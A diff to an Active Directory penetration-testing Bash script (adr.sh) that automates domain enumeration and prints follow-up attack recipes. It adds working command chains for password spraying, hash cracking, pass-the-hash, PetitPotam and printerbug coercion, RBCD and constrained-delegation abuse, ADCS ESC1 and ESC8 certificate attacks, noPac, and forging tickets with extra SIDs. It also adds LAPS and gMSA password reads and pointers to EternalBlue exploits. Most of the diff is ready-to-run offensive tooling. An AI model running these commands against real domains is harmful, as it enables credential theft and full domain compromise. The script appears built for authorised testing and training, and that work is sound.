@@ -131,6 +131,11 @@ SKIP_BLOODHOUND=false
 SKIP_SHARES=false
 QUICK_MODE=false
 FORCE_MODE=false
+KERBEROS=false
+
+# Absolute directory of this script — used to emit PWD-independent attack
+# commands that reference sibling scripts (sprayr.sh, crackr.sh, etc.)
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
 # Auth arrays — populated by build_*_auth() helpers, used by phase functions
 declare -a NXC_AUTH=()
@@ -213,9 +218,12 @@ normalize_hash() {
 build_nxc_auth() {
     if [[ "$AUTH_TYPE" == "hash" ]]; then
         NXC_AUTH=(-u "$AD_USER" -H "$NT_HASH" -d "$DOMAIN" -t "$THREADS")
+    elif [[ "$AUTH_TYPE" == "kerberos" ]]; then
+        NXC_AUTH=(-u "$AD_USER" -d "$DOMAIN" -t "$THREADS" --use-kcache)
     else
         NXC_AUTH=(-u "$AD_USER" -p "$PASS" -d "$DOMAIN" -t "$THREADS")
     fi
+    [[ "$KERBEROS" == "true" && "$AUTH_TYPE" != "kerberos" ]] && NXC_AUTH+=(-k)
 }
 
 build_rpc_auth() {
@@ -241,10 +249,13 @@ build_smbc_auth() {
 }
 
 build_impacket_auth() {
-    # IMPACKET_TARGET: positional arg.  IMPACKET_AUTH_ARGS: optional -hashes
+    # IMPACKET_TARGET: positional arg.  IMPACKET_AUTH_ARGS: optional -hashes / -k -no-pass
     if [[ "$AUTH_TYPE" == "hash" ]]; then
         IMPACKET_TARGET="${DOMAIN}/${AD_USER}"
         IMPACKET_AUTH_ARGS=(-hashes "$LM_NT_HASH")
+    elif [[ "$AUTH_TYPE" == "kerberos" ]]; then
+        IMPACKET_TARGET="${DOMAIN}/${AD_USER}"
+        IMPACKET_AUTH_ARGS=(-k -no-pass)
     else
         IMPACKET_TARGET="${DOMAIN}/${AD_USER}:${PASS}"
         IMPACKET_AUTH_ARGS=()
@@ -307,26 +318,112 @@ generate_ad_2025_next_steps() {
             "cat ${OUTDIR}/password_policy.txt" \
             "wc -l ${OUTDIR}/users/all_users.txt" \
             "nxc smb ${DC_IP} -u ${OUTDIR}/users/all_users.txt -p 'Password1' -d ${DOMAIN} --continue-on-success" \
-            "./sprayr.sh -U ${OUTDIR}/users/all_users.txt -p 'Password1' -d ${DOMAIN} -t ${DC_IP} --safe" \
+            "${SCRIPT_DIR}/sprayr.sh -U ${OUTDIR}/users/all_users.txt -p 'Password1' -d ${DOMAIN} -t ${DC_IP} --safe" \
             "nxc winrm ${DC_IP} -u ${OUTDIR}/users/all_users.txt -p 'Password1' -d ${DOMAIN} --continue-on-success"
     fi
 
     if [[ -s "${OUTDIR}/hashes/asreproast.txt" ]]; then
         attack_cmd_once "AS-REP ROAST FOLLOW-UP (crack, spray, retest)" \
             "# Evidence: hashes/asreproast.txt contains AS-REP hash material" \
-            "./crackr.sh -f ${OUTDIR}/hashes/asreproast.txt" \
+            "${SCRIPT_DIR}/crackr.sh -f ${OUTDIR}/hashes/asreproast.txt" \
             "hashcat -m 18200 ${OUTDIR}/hashes/asreproast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --show" \
-            "./sprayr.sh -U ${OUTDIR}/users/all_users.txt -P ${OUTDIR}/hashes/cracked_passwords.txt -d ${DOMAIN} -t ${DC_IP} --safe" \
+            "${SCRIPT_DIR}/sprayr.sh -U ${OUTDIR}/users/all_users.txt -P ${OUTDIR}/hashes/cracked_passwords.txt -d ${DOMAIN} -t ${DC_IP} --safe" \
             "nxc smb ${DC_IP} -u ${OUTDIR}/users/asrep_candidates.txt -p '<CRACKED_PASS>' -d ${DOMAIN} --continue-on-success"
     fi
 
     if [[ -s "${OUTDIR}/hashes/kerberoast.txt" ]]; then
         attack_cmd_once "KERBEROAST FOLLOW-UP (crack SPNs, prioritize paths)" \
             "# Evidence: hashes/kerberoast.txt contains Kerberoast hash material" \
-            "./crackr.sh -f ${OUTDIR}/hashes/kerberoast.txt" \
+            "${SCRIPT_DIR}/crackr.sh -f ${OUTDIR}/hashes/kerberoast.txt" \
             "hashcat -m 13100 ${OUTDIR}/hashes/kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --show" \
             "cat ${OUTDIR}/users/kerberoastable.txt" \
             "# In BloodHound: Kerberoastable Users with Path to Domain Admins"
+    fi
+
+    if grep -qF "LAPS_READABLE=YES" "$notes" 2>/dev/null; then
+        attack_cmd_once "LAPS FOLLOW-UP (local admin passwords readable)" \
+            "# Evidence: ldap/laps.txt contains ms-Mcs-AdmPwd attribute values" \
+            "cat ${OUTDIR}/ldap/laps.txt" \
+            "# Extract host:password pairs and authenticate as local admin:" \
+            "grep -iE 'Computer|Password' ${OUTDIR}/ldap/laps.txt" \
+            "# Local-auth spray with recovered passwords (LAPS pw = local admin, not domain):" \
+            "nxc smb <HOST> -u Administrator -p '<LAPS_PASSWORD>' --local-auth" \
+            "evil-winrm -i <HOST> -u Administrator -p '<LAPS_PASSWORD>'"
+    fi
+
+    if grep -qF "GMSA_HASH=YES" "$notes" 2>/dev/null; then
+        attack_cmd_once "gMSA FOLLOW-UP (managed service account NT hash recovered)" \
+            "# Evidence: ldap/gmsa.txt contains msDS-ManagedPassword-derived NT hash" \
+            "cat ${OUTDIR}/ldap/gmsa.txt" \
+            "# Pass-the-Hash with the gMSA account (often tied to SQL / services / scheduled tasks):" \
+            "nxc smb ${DC_IP} -u '<GMSA_ACCOUNT$>' -H '<NT_HASH>' -d ${DOMAIN}" \
+            "impacket-psexec -hashes ':<NT_HASH>' ${DOMAIN}/'<GMSA_ACCOUNT$>'@${DC_IP}" \
+            "# Request TGT as gMSA for Kerberos-only services:" \
+            "impacket-getTGT -hashes ':<NT_HASH>' ${DOMAIN}/'<GMSA_ACCOUNT$>'"
+    fi
+
+    if grep -qF "UNCONSTRAINED_DELEGATION=YES" "$notes" 2>/dev/null; then
+        attack_cmd_once "UNCONSTRAINED DELEGATION FOLLOW-UP (coerce + TGT capture)" \
+            "# Evidence: ldap/delegation.txt lists hosts with TRUSTED_FOR_DELEGATION" \
+            "grep -iE 'Unconstrained' ${OUTDIR}/ldap/delegation.txt" \
+            "# On the unconstrained host (once you have local admin), monitor LSASS for captured TGTs:" \
+            "# 1. Run rubeus monitor / impacket-secretsdump -just-dc on gathered TGT" \
+            "# 2. Coerce a DC to authenticate to the unconstrained host:" \
+            "impacket-printerbug ${DOMAIN}/${AD_USER}@${DC_IP} <UNCONSTRAINED_HOST>" \
+            "python3 PetitPotam.py -u ${AD_USER} -p '<PASS>' -d ${DOMAIN} <UNCONSTRAINED_HOST> ${DC_IP}" \
+            "# 3. On unconstrained host: rubeus monitor /interval:5 /filteruser:<DC_HOSTNAME>$" \
+            "# 4. Replay DC TGT: impacket-secretsdump -just-dc -k -no-pass ${DOMAIN}/<DC_HOSTNAME>\$@${DC_IP}"
+    elif grep -qF "DELEGATION_FOUND=YES" "$notes" 2>/dev/null; then
+        attack_cmd_once "DELEGATION FOLLOW-UP (constrained / RBCD abuse)" \
+            "# Evidence: ldap/delegation.txt lists accounts with AllowedToDelegateTo / RBCD" \
+            "cat ${OUTDIR}/ldap/delegation.txt" \
+            "# Constrained delegation (S4U2Self + S4U2Proxy) — request service ticket as DA:" \
+            "impacket-getST -spn cifs/<TARGET> -impersonate Administrator ${DOMAIN}/'<SVC_ACCT>':'<PASS>'" \
+            "# RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity):" \
+            "impacket-rbcd -delegate-from '<CONTROLLED_COMPUTER\$>' -delegate-to '<TARGET\$>' -action write ${DOMAIN}/${AD_USER}:'<PASS>'" \
+            "impacket-getST -spn cifs/<TARGET> -impersonate Administrator -dc-ip ${DC_IP} ${DOMAIN}/'<CONTROLLED_COMPUTER\$>':'<PASS>'" \
+            "export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass <TARGET>"
+    fi
+
+    if grep -qF "ADCS_VULNERABLE=YES" "$notes" 2>/dev/null; then
+        attack_cmd_once "ADCS FOLLOW-UP (certipy-ad — ESC1/ESC2/ESC4/ESC8 exploit paths)" \
+            "# Evidence: adcs/certipy_find.txt lists vulnerable templates" \
+            "grep -iE 'ESC[0-9]+|Vulnerable|Template Name' ${OUTDIR}/adcs/certipy_find.txt" \
+            "# ESC1 — request cert with alternate SAN (UPN) as any user:" \
+            "certipy-ad req -u ${AD_USER}@${DOMAIN} -p '<PASS>' -ca '<CA_NAME>' -template '<VULN_TEMPLATE>' -upn administrator@${DOMAIN} -dc-ip ${DC_IP}" \
+            "# Authenticate with recovered cert → get NT hash (Pass-the-Certificate):" \
+            "certipy-ad auth -pfx administrator.pfx -dc-ip ${DC_IP}" \
+            "# ESC8 — NTLM relay to AD CS HTTP endpoint (requires signing disabled on CA host):" \
+            "sudo impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController" \
+            "# Pass-the-Hash once NT recovered:" \
+            "nxc smb ${DC_IP} -u administrator -H '<NT_HASH>' --sam"
+    fi
+
+    local maq_val=""
+    maq_val=$(grep -oP '(?<=MAQ=)[0-9]+' "$notes" 2>/dev/null | head -1 || true)
+    if [[ -n "$maq_val" ]] && (( maq_val > 0 )); then
+        attack_cmd_once "MACHINE ACCOUNT QUOTA FOLLOW-UP (MAQ=${maq_val} — noPac / RBCD prep)" \
+            "# Evidence: ms-DS-MachineAccountQuota=${maq_val} — any domain user can create up to ${maq_val} computer account(s)" \
+            "# 1. Create a computer account under your control:" \
+            "impacket-addcomputer -computer-name 'PWN\$' -computer-pass 'Pwn3dP@ss!' ${DOMAIN}/${AD_USER}:'<PASS>' -dc-ip ${DC_IP}" \
+            "# 2. RBCD: grant PWN\$ delegation rights on a target computer (requires GenericWrite on target):" \
+            "impacket-rbcd -delegate-from 'PWN\$' -delegate-to '<TARGET\$>' -action write ${DOMAIN}/${AD_USER}:'<PASS>' -dc-ip ${DC_IP}" \
+            "# 3. Request service ticket as Administrator via S4U2Proxy:" \
+            "impacket-getST -spn cifs/<TARGET> -impersonate Administrator -dc-ip ${DC_IP} ${DOMAIN}/'PWN\$':'Pwn3dP@ss!'" \
+            "export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass ${DOMAIN}/Administrator@<TARGET>" \
+            "# Alternative — noPac (CVE-2021-42278/42287, patched on updated DCs):" \
+            "impacket-noPac -dc-ip ${DC_IP} -dc-host '<DC_HOSTNAME>' '${DOMAIN}/${AD_USER}:<PASS>' -shell --impersonate administrator"
+    fi
+
+    if grep -qF "DOMAIN_TRUSTS=YES" "$notes" 2>/dev/null; then
+        attack_cmd_once "DOMAIN TRUST FOLLOW-UP (forest / cross-domain attacks)" \
+            "# Evidence: ldap/trusts.txt lists inter-domain trust relationships" \
+            "cat ${OUTDIR}/ldap/trusts.txt" \
+            "# Enum users / admins in trusted domain via current creds:" \
+            "nxc ldap ${DC_IP} ${NXC_AUTH[*]} --users -d '<TRUSTED_DOMAIN>'" \
+            "# SID history abuse (if you own the trust side with DCSync):" \
+            "impacket-secretsdump -just-dc ${DOMAIN}/${AD_USER}:'<PASS>'@${DC_IP}  # get krbtgt of current domain" \
+            "impacket-ticketer -nthash '<PARENT_KRBTGT_NT>' -domain-sid '<CURRENT_SID>' -domain ${DOMAIN} -extra-sid '<TRUSTED_DOMAIN_SID>-519' Administrator"
     fi
 
     if [[ -s "${OUTDIR}/computers/nxc_computers.txt" || -s "${OUTDIR}/computers/all_computers.txt" ]]; then
@@ -456,6 +553,25 @@ phase1_domain_context() {
     phase "1 — Domain Context (connectivity + credential validation)"
     progress_log "START" "$phase_key" "domain=${DOMAIN} dc=${DC_IP}"
 
+    info "Reminder: try null/anonymous auth BEFORE adr.sh on fresh engagements"
+    info "  nxc smb ${DC_IP} -u '' -p ''          # null-auth enumeration"
+    info "  nxc smb ${DC_IP} -u 'guest' -p ''     # guest-auth"
+    info "  nxc smb ${DC_IP} -u '' -p '' --pass-pol   # policy without creds"
+    info "  rpcclient -U '' -N ${DC_IP}           # then: enumdomusers / querydispinfo"
+
+    # Always emit the null/anon recipe block (independent of current creds)
+    attack_cmd_once "NULL / ANONYMOUS BIND ENUMERATION (no creds required)" \
+        "# Run these FIRST on any fresh DC — many labs leak on null bind" \
+        "nxc smb ${DC_IP} -u '' -p ''" \
+        "nxc smb ${DC_IP} -u 'guest' -p ''" \
+        "nxc smb ${DC_IP} -u '' -p '' --pass-pol" \
+        "nxc ldap ${DC_IP} -u '' -p '' --users --pass-pol" \
+        "rpcclient -U '' -N ${DC_IP} -c 'enumdomusers'" \
+        "rpcclient -U '' -N ${DC_IP} -c 'querydispinfo'" \
+        "rpcclient -U '' -N ${DC_IP} -c 'lsaquery'" \
+        "smbclient -L //${DC_IP}/ -N" \
+        "impacket-lookupsid ${DOMAIN}/guest@${DC_IP}   # leave password prompt empty"
+
     # 1a. Ping
     if timeout 10 ping -c1 -W3 "$DC_IP" &>/dev/null; then
         success "DC reachable via ICMP"
@@ -473,6 +589,29 @@ phase1_domain_context() {
             warn "TCP ${port} appears closed or filtered"
         fi
     done
+
+    # 1b2. Clock skew check vs DC (Kerberos fails with >5min skew)
+    if command -v rdate &>/dev/null; then
+        local dc_epoch local_epoch skew
+        dc_epoch=$(timeout 5 rdate -p -n "$DC_IP" 2>/dev/null \
+            | awk '{$1=""; sub(/^ /, ""); print}' \
+            | { read -r d; date -d "$d" +%s 2>/dev/null || true; })
+        local_epoch=$(date +%s)
+        if [[ "$dc_epoch" =~ ^[0-9]+$ ]]; then
+            skew=$(( dc_epoch > local_epoch ? dc_epoch - local_epoch : local_epoch - dc_epoch ))
+            if (( skew > 300 )); then
+                warn "*** CLOCK SKEW ${skew}s vs DC — Kerberos will fail (>300s limit) ***"
+                warn "Fix: sudo rdate -n ${DC_IP}   (or sudo ntpdate -s ${DC_IP})"
+                echo "CLOCK_SKEW=${skew}" >> "${OUTDIR}/summary_notes.txt"
+            else
+                info "Clock skew vs DC: ${skew}s (within Kerberos tolerance)"
+            fi
+        else
+            info "Clock-skew check skipped (could not parse rdate output)"
+        fi
+    else
+        info "rdate not installed — skipping clock-skew check (apt install rdate)"
+    fi
 
     # 1c. Credential validation via nxc
     build_nxc_auth
@@ -721,7 +860,7 @@ phase2_user_enum() {
                 attack_cmd "SPRAY AGAINST PRIVILEGED GROUP MEMBERS" \
                     "cat ${priv_members_file}" \
                     "nxc smb ${DC_IP} -u ${priv_members_file} -p 'CRACKED_PASS' -d ${DOMAIN} --continue-on-success" \
-                    "./sprayr.sh -U ${priv_members_file} -p 'CRACKED_PASS' -t ${DC_IP}"
+                    "${SCRIPT_DIR}/sprayr.sh -U ${priv_members_file} -p 'CRACKED_PASS' -t ${DC_IP}"
             fi
         fi
     fi
@@ -733,6 +872,162 @@ phase2_user_enum() {
         "nxc smb ${DC_IP} -u ${OUTDIR}/users/all_users.txt -H 'CRACKED_NT_HASH' -d ${DOMAIN} --continue-on-success"
 
     progress_log "DONE" "$phase_key" "users=${user_count}"
+}
+
+#==============================================================================
+# PHASE 2b — TARGETED LDAP ENUMERATION (LAPS / gMSA / delegation / trusts / MAQ)
+#==============================================================================
+phase2b_ldap_enum() {
+    local phase_key="phase2b_ldap_enum"
+    if is_phase_done "$phase_key"; then
+        info "Phase 2b already complete (--force to redo)"
+        return 0
+    fi
+
+    phase "2b — Targeted LDAP Enumeration (LAPS / gMSA / delegation / trusts)"
+    progress_log "START" "$phase_key" ""
+    mkdir -p "${OUTDIR}/ldap"
+
+    build_nxc_auth
+    local ldap_dir="${OUTDIR}/ldap"
+
+    # 2b.1 LAPS — local admin password reads (if operator has the right)
+    cmd_log "nxc ldap ${DC_IP} ${NXC_AUTH[*]} --laps"
+    timeout 60 nxc ldap "$DC_IP" "${NXC_AUTH[@]}" --laps \
+        > "${ldap_dir}/laps.txt" 2>&1 || true
+    if grep -qiE 'ms-mcs-admpwd|LAPS.*Password|laps.*:' "${ldap_dir}/laps.txt" 2>/dev/null; then
+        success "*** LAPS PASSWORDS READABLE — see ldap/laps.txt ***"
+        echo "LAPS_READABLE=YES" >> "${OUTDIR}/summary_notes.txt"
+    else
+        info "No LAPS passwords readable (or LAPS not deployed)"
+    fi
+
+    # 2b.2 gMSA — managed service account blob reads
+    cmd_log "nxc ldap ${DC_IP} ${NXC_AUTH[*]} --gmsa"
+    timeout 60 nxc ldap "$DC_IP" "${NXC_AUTH[@]}" --gmsa \
+        > "${ldap_dir}/gmsa.txt" 2>&1 || true
+    if grep -qiE 'gmsa|msds-managedpassword|Account:' "${ldap_dir}/gmsa.txt" 2>/dev/null; then
+        success "gMSA information collected → ldap/gmsa.txt"
+        if grep -qiE 'NTHASH|:[a-fA-F0-9]{32}' "${ldap_dir}/gmsa.txt" 2>/dev/null; then
+            success "*** gMSA NT HASH RECOVERED — ldap/gmsa.txt ***"
+            echo "GMSA_HASH=YES" >> "${OUTDIR}/summary_notes.txt"
+        fi
+    fi
+
+    # 2b.3 Delegation paths — unconstrained, constrained, RBCD
+    cmd_log "nxc ldap ${DC_IP} ${NXC_AUTH[*]} --find-delegation"
+    timeout 60 nxc ldap "$DC_IP" "${NXC_AUTH[@]}" --find-delegation \
+        > "${ldap_dir}/delegation.txt" 2>&1 || true
+    if [[ -s "${ldap_dir}/delegation.txt" ]] && \
+       grep -qiE 'Unconstrained|Constrained|RBCD|AllowedToDelegate' "${ldap_dir}/delegation.txt" 2>/dev/null; then
+        success "Delegation paths found → ldap/delegation.txt"
+        echo "DELEGATION_FOUND=YES" >> "${OUTDIR}/summary_notes.txt"
+        grep -iE 'Unconstrained' "${ldap_dir}/delegation.txt" 2>/dev/null \
+            && echo "UNCONSTRAINED_DELEGATION=YES" >> "${OUTDIR}/summary_notes.txt" || true
+    fi
+
+    cmd_log "nxc ldap ${DC_IP} ${NXC_AUTH[*]} --trusted-for-delegation"
+    timeout 60 nxc ldap "$DC_IP" "${NXC_AUTH[@]}" --trusted-for-delegation \
+        >> "${ldap_dir}/delegation.txt" 2>&1 || true
+
+    # 2b.4 Accounts with PASSWD_NOTREQD
+    cmd_log "nxc ldap ${DC_IP} ${NXC_AUTH[*]} --password-not-required"
+    timeout 60 nxc ldap "$DC_IP" "${NXC_AUTH[@]}" --password-not-required \
+        > "${ldap_dir}/passwd_notreqd.txt" 2>&1 || true
+    if grep -qE '[a-zA-Z_.-]+\s*$' "${ldap_dir}/passwd_notreqd.txt" 2>/dev/null && \
+       [[ -s "${ldap_dir}/passwd_notreqd.txt" ]]; then
+        local pnr_count
+        pnr_count=$(grep -cE '^\S' "${ldap_dir}/passwd_notreqd.txt" 2>/dev/null || echo 0)
+        if (( pnr_count > 0 )); then
+            info "Password-not-required accounts: ${pnr_count} → ldap/passwd_notreqd.txt"
+            echo "PASSWD_NOTREQD=${pnr_count}" >> "${OUTDIR}/summary_notes.txt"
+        fi
+    fi
+
+    # 2b.5 adminCount=1 (adminSDHolder-protected accounts)
+    cmd_log "nxc ldap ${DC_IP} ${NXC_AUTH[*]} --admin-count"
+    timeout 60 nxc ldap "$DC_IP" "${NXC_AUTH[@]}" --admin-count \
+        > "${ldap_dir}/admin_count.txt" 2>&1 || true
+    success "adminCount=1 accounts → ldap/admin_count.txt"
+
+    # 2b.6 Domain trusts (multi-domain / forest targeting)
+    cmd_log "nxc ldap ${DC_IP} ${NXC_AUTH[*]} -M enum_trusts"
+    timeout 60 nxc ldap "$DC_IP" "${NXC_AUTH[@]}" -M enum_trusts \
+        > "${ldap_dir}/trusts.txt" 2>&1 || true
+    if grep -qiE 'trust|targetname' "${ldap_dir}/trusts.txt" 2>/dev/null; then
+        success "Domain trusts enumerated → ldap/trusts.txt"
+        echo "DOMAIN_TRUSTS=YES" >> "${OUTDIR}/summary_notes.txt"
+    fi
+
+    # 2b.7 Machine Account Quota (MAQ > 0 → noPac / sAMAccountName attack prep)
+    if [[ "${TOOL_STATUS[ldapsearch]}" == "ok" && "$AUTH_TYPE" == "password" ]]; then
+        cmd_log "ldapsearch -x -H ldap://${DC_IP} -D ${AD_USER}@${DOMAIN} -b ${BASE_DN} '(objectClass=domain)' ms-DS-MachineAccountQuota"
+        timeout 30 ldapsearch \
+            -x -H "ldap://${DC_IP}" \
+            -D "${AD_USER}@${DOMAIN}" -w "$PASS" \
+            -b "$BASE_DN" \
+            "(objectClass=domain)" ms-DS-MachineAccountQuota \
+            > "${ldap_dir}/machine_account_quota.txt" 2>&1 || true
+        local maq
+        maq=$(grep -oP 'ms-DS-MachineAccountQuota:\s*\K[0-9]+' "${ldap_dir}/machine_account_quota.txt" 2>/dev/null | head -1)
+        if [[ -n "$maq" ]]; then
+            info "MachineAccountQuota = ${maq}"
+            echo "MAQ=${maq}" >> "${OUTDIR}/summary_notes.txt"
+            if (( maq > 0 )); then
+                success "*** MAQ=${maq} — any domain user can create computer accounts (noPac / RBCD prep) ***"
+            fi
+        fi
+    else
+        info "Skipping MAQ (ldapsearch required with password auth)"
+    fi
+
+    progress_log "DONE" "$phase_key" ""
+}
+
+#==============================================================================
+# PHASE 2c — ADCS ENUMERATION (certipy-ad)
+#==============================================================================
+phase2c_adcs() {
+    local phase_key="phase2c_adcs"
+    if is_phase_done "$phase_key"; then
+        info "Phase 2c already complete (--force to redo)"
+        return 0
+    fi
+
+    phase "2c — ADCS Enumeration (certipy-ad find -vulnerable)"
+    progress_log "START" "$phase_key" ""
+    mkdir -p "${OUTDIR}/adcs"
+
+    if ! command -v certipy-ad &>/dev/null; then
+        warn "certipy-ad not installed — skipping ADCS enumeration"
+        warn "Install: pipx install certipy-ad"
+        progress_log "SKIP" "$phase_key" "certipy-ad not installed"
+        return 0
+    fi
+
+    local certipy_args=(-u "${AD_USER}@${DOMAIN}" -dc-ip "$DC_IP" -stdout -vulnerable)
+    if [[ "$AUTH_TYPE" == "hash" ]]; then
+        certipy_args+=(-hashes "$LM_NT_HASH")
+    elif [[ "$AUTH_TYPE" == "kerberos" ]]; then
+        certipy_args+=(-k -no-pass)
+    else
+        certipy_args+=(-p "$PASS")
+    fi
+
+    cmd_log "certipy-ad find ${certipy_args[*]}"
+    timeout 120 certipy-ad find "${certipy_args[@]}" \
+        > "${OUTDIR}/adcs/certipy_find.txt" 2>&1 || true
+
+    if grep -qiE 'ESC[0-9]+|Vulnerable' "${OUTDIR}/adcs/certipy_find.txt" 2>/dev/null; then
+        success "*** ADCS VULNERABILITIES FOUND — adcs/certipy_find.txt ***"
+        grep -iE 'ESC[0-9]+|Vulnerable|Enrollment' "${OUTDIR}/adcs/certipy_find.txt" \
+            | head -20 | sed 's/^/  /'
+        echo "ADCS_VULNERABLE=YES" >> "${OUTDIR}/summary_notes.txt"
+    else
+        info "No obvious ADCS vulnerabilities (or CA not present)"
+    fi
+
+    progress_log "DONE" "$phase_key" ""
 }
 
 #==============================================================================
@@ -783,7 +1078,7 @@ phase3_kerberos() {
             attack_cmd "CRACK AS-REP HASHES (hashcat mode 18200)" \
                 "hashcat -m 18200 ${asrep_file} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule" \
                 "# Or via crackr.sh (auto-detects 18200):" \
-                "./crackr.sh -f ${asrep_file}"
+                "${SCRIPT_DIR}/crackr.sh -f ${asrep_file}"
         else
             info "No AS-REP roastable accounts found"
             echo "ASREP_COUNT=0" >> "${OUTDIR}/summary_notes.txt"
@@ -821,7 +1116,7 @@ phase3_kerberos() {
             attack_cmd "CRACK KERBEROAST HASHES (hashcat mode 13100)" \
                 "hashcat -m 13100 ${kerb_file} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule" \
                 "# Or via crackr.sh (auto-detects 13100):" \
-                "./crackr.sh -f ${kerb_file}"
+                "${SCRIPT_DIR}/crackr.sh -f ${kerb_file}"
         else
             info "No Kerberoastable accounts found"
             echo "KERB_COUNT=0" >> "${OUTDIR}/summary_notes.txt"
@@ -1198,9 +1493,7 @@ phase9_spray_cracked() {
     phase "9 — Spray Cracked Passwords"
     progress_log "START" "$phase_key" ""
 
-    local script_dir
-    script_dir="$(cd "$(dirname "$0")" && pwd)"
-    local sprayr="${script_dir}/sprayr.sh"
+    local sprayr="${SCRIPT_DIR}/sprayr.sh"
     local user_list="${OUTDIR}/users/all_users.txt"
     local asrep_file="${OUTDIR}/hashes/asreproast.txt"
     local kerb_file="${OUTDIR}/hashes/kerberoast.txt"
@@ -1359,9 +1652,24 @@ mode_chain() {
         echo "[$(date '+%H:%M:%S')] Step 3 DONE — kerberos attacks" >> "$chain_log"
     fi
 
-    # Step 4: Credential looting (SAM, LSA, DPAPI, browser)
+    # Step 4: Credential looting (SAM, LSA, DPAPI, browser) — requires admin on DC
     if chain_prompt "STEP 4: CREDENTIAL DUMP (requires admin on target)" \
         "SAM dump, LSA secrets, DPAPI, lsassy, browser creds — needs Pwn3d access"; then
+        if ! grep -qF "ADMIN_ON_DC=YES" "${OUTDIR}/summary_notes.txt" 2>/dev/null; then
+            warn "ADMIN_ON_DC marker not set — SAM/LSA/DPAPI dumps require admin on ${DC_IP}"
+            warn "  phase1 did not detect admin access. Dumps will likely fail with STATUS_ACCESS_DENIED."
+            echo -en "${BOLD}Continue anyway? [y/N] ${NC}"
+            local confirm=""
+            read -r confirm
+            case "${confirm,,}" in
+                y|yes) : ;;
+                *)
+                    info "Skipping Step 4 — escalate first, then re-run with --chain"
+                    echo "[$(date '+%H:%M:%S')] Step 4 SKIPPED — no admin marker" >> "$chain_log"
+                    return 0
+                    ;;
+            esac
+        fi
         local loot_dir="${OUTDIR}/loot"
         mkdir -p "$loot_dir"
 
@@ -1410,7 +1718,7 @@ mode_chain() {
                 info "    ./sprayr.sh -u ${AD_USER} -P ${loot_dir}/browser_passwords.txt -t ${DC_IP}"
                 attack_cmd "SPRAY BROWSER PASSWORDS (from enum_chrome dump)" \
                     "grep -iE 'password' ${loot_dir}/browser_creds.txt | awk '{print \$NF}' > ${loot_dir}/browser_passwords.txt" \
-                    "./sprayr.sh -P ${loot_dir}/browser_passwords.txt -t ${DC_IP}"
+                    "${SCRIPT_DIR}/sprayr.sh -P ${loot_dir}/browser_passwords.txt -t ${DC_IP}"
             fi
         fi
 
@@ -1433,9 +1741,7 @@ mode_chain() {
     if chain_prompt "STEP 6: PASS-THE-HASH SPRAY" \
         "Spray any NTLM hashes from Step 4 against all domain hosts"; then
         local loot_dir="${OUTDIR}/loot"
-        local script_dir
-        script_dir="$(cd "$(dirname "$0")" && pwd)"
-        local sprayr="${script_dir}/sprayr.sh"
+        local sprayr="${SCRIPT_DIR}/sprayr.sh"
         local hashes_found=false
 
         # Collect unique hashes from loot
@@ -1627,8 +1933,9 @@ write_summary() {
                 os_ver=$(echo "${os_line}" | tr '[:upper:]' '[:lower:]')
                 case "${os_ver}" in
                     *"windows 7"*|*"2008"*|*"xp"*|*"vista"*)
-                        echo "  ${os_host}: MS17-010 (EternalBlue) — nxc smb ${os_host} -M ms17-010"
-                        echo "    impacket-eternalblue ${os_host}  OR  msf: use exploit/windows/smb/ms17_010_eternalblue" ;;
+                        echo "  ${os_host}: MS17-010 (EternalBlue) — detect: nxc smb ${os_host} -M ms17-010"
+                        echo "    Exploit (OffSec: MSF limit = 1 target across engagement): msf: use exploit/windows/smb/ms17_010_eternalblue"
+                        echo "    Manual (no MSF): use worawit/MS17-010 PoC (checker.py → eternalblue_exploit7.py / zzz_exploit.py)" ;;
                     *"2012"*|*"windows 8"*)
                         echo "  ${os_host}: Check MS17-010, PrintNightmare, EternalBlue"
                         echo "    nxc smb ${os_host} -M ms17-010" ;;
@@ -1690,20 +1997,39 @@ REQUIRED:
 AUTHENTICATION (one required):
   -p, --password PASS       Plaintext password
   -H, --hash NTLM           NTLM hash — formats: :NTLMHASH or LMHASH:NTLMHASH
+  -k, --kerberos            Kerberos auth — uses ccache in KRB5CCNAME env var
+                            (no -p/-H needed; DC hostname recommended via --dc-host)
 
 OPTIONS:
   --outdir DIR              Output directory (default: $TOOLKIT_ROOT/ad/<DOMAIN>/)
-  --dc-host HOSTNAME        DC hostname for Kerberos authentication
+  --dc-host HOSTNAME        DC hostname (required for Kerberos; helps AS-REP/getST)
   --skip-bloodhound         Skip BloodHound collection
   --skip-shares             Skip share enumeration
+  --chain                   Interactive AD kill chain walkthrough
   --quick                   Phases 1-3 only (fast sweep, skip slow phases)
   --force                   Re-run all phases (ignore completed progress.log)
   --threads N               nxc thread count (default: 10)
+  --no-color                Disable ANSI colors
   -h, --help                This help
+
+PHASES (default run, in order):
+  Phase 1   Domain context, password policy, clock-skew vs DC, null-auth hints
+  Phase 2   User enumeration + description mining (credentials in descriptions)
+  Phase 2b  Targeted LDAP: LAPS, gMSA, delegation, trusts, adminCount, MAQ
+  Phase 2c  ADCS enumeration (certipy-ad find -vulnerable — ESC1..ESC13 detect)
+  Phase 3   Kerberoast + AS-REP roast (hash collection only, no auto-crack)
+  Phase 4   Computer enumeration, legacy-OS detection (MS17-010 hints)
+  Phase 5   SMB signing audit (relay candidate list)
+  Phase 6   BloodHound collection (bloodhound-ce-python)
+  Phase 7   Share enumeration (SYSVOL GPP, readable shares)
+  Phase 8   Session enumeration (RID-level logged-on users)
+  Phase 9   Re-spray cracked passwords (requires prior crackr.sh run)
 
 EXAMPLES:
   ./adr.sh -d corp.local -u administrator -p Password1 -dc 10.10.10.5
   ./adr.sh -d corp.local -u jdoe -H :aad3b435b51404eeaad3b435b51404ee -dc 10.10.10.5
+  export KRB5CCNAME=/tmp/jdoe.ccache
+  ./adr.sh -d corp.local -u jdoe -k --dc-host DC01 -dc 10.10.10.5
   ./adr.sh -d corp.local -u jdoe -p Pass -dc 10.10.10.5 --quick
   ./adr.sh -d corp.local -u jdoe -p Pass -dc 10.10.10.5 --force --skip-bloodhound
 
